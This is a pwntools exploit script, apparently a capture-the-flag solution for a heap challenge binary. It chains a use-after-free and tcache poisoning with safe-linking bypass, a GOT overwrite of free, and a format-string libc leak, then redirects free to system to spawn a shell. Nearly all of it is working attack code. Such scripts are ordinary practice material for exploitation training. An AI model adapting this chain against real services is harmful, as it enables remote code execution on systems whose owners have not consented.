#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 12345 ./main
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./main')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 12345)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x000000000040157c
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
libc = exe.libc
def add():
    io.sendlineafter(b"> ",b'1')
    # io.sendlineafter(b"ze:\n",str(sz).encode())

def edit(idx,desc):
    io.sendlineafter(b"> ",b'2')
    io.sendlineafter(b":\n",str(idx))
    io.sendafter(b":\n",str(desc))

def delete(idx):
    io.sendlineafter(b"> ",b'3')
    io.sendlineafter(b":\n",str(idx))

def view(idx):
    io.sendlineafter(b"> ",b'4')
    io.sendlineafter(b":\n",str(idx))

add()
add()
add()
delete(0)
delete(1)
view(0)

io.recvuntil('OUTPUT:')
heap = u64(io.recvline()[:-1].ljust(8,"\x00")) 
heap_base = heap << 12
print hex(heap)
print hex(heap_base)
print hex(0x404120 & 0xf)
edit(1,p64(0x404120^heap))
add() # 0
add() #1
edit(1,p64(exe.got['free']))
edit(4,p64(exe.plt['printf']))

edit(0,'%39$p')
delete(0)
libc.address = int(io.recvuntil("DELE",drop=True),16) - libc.sym['__libc_start_main'] -128
print hex(libc.address) 

edit(4,p64(libc.sym['system']))
edit(2,"/bin/sh\x00")
delete(2)
# add()
# add()

io.interactive()

